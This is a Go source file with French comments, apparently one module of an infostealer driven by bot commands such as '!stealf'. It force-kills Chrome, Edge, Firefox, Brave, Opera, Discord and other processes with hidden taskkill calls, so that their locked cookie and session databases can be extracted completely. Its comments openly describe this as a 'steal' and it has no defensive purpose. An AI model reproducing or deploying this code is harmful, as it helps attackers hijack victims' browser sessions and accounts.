// browsers_kill.go — fermeture des navigateurs avant extraction.
//
// Chrome et Edge gardent leurs bases de cookies ouvertes pendant la
// navigation : la lecture échoue alors avec « utilisé par un autre
// processus ». `!stealf` ferme les navigateurs, attend que les verrous
// tombent, puis lance l'extraction — les cookies et les sessions arrivent
// complets au lieu d'être partiels.
package main

import (
	"fmt"
	"os/exec"
	"strings"
	"time"
)

// browserProcesses liste les exécutables à fermer avant un steal complet.
var browserProcesses = []string{
	"chrome", "msedge", "firefox", "brave", "vivaldi", "opera",
	"operagx", "chromium", "yandex", "discord", "Discord",
}

// killBrowsers ferme proprement (puis brutalement) les navigateurs.
func killBrowsers() {
	for _, name := range browserProcesses {
		c := exec.Command("taskkill.exe", "/IM", name+".exe", "/T", "/F")
		c.SysProcAttr = hiddenAttr()
		_ = c.Run()
	}
	// Les écritures SQLite se terminent en quelques centaines de millisecondes.
	time.Sleep(2 * time.Second)
}

// browserStates rend la liste des navigateurs encore ouverts, pour le
// diagnostic (`!diag`) et pour expliquer un steal partiel.
func browserStates() string {
	out, err := runPSUTF8("Get-Process chrome,msedge,firefox,brave,vivaldi,opera -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ProcessName -Unique")
	if err != nil && strings.TrimSpace(out) == "" {
		return "aucun"
	}
	s := strings.TrimSpace(out)
	s = strings.Join(strings.Fields(s), ", ")
	if s == "" {
		return "aucun"
	}
	return s
}

// stealForceHint explique quoi faire quand une base reste verrouillée.
func stealForceHint() string {
	states := browserStates()
	if states == "aucun" {
		return ""
	}
	return fmt.Sprintf("navigateurs encore ouverts (%s) : `!stealf` les ferme et refait l'extraction.", states)
}
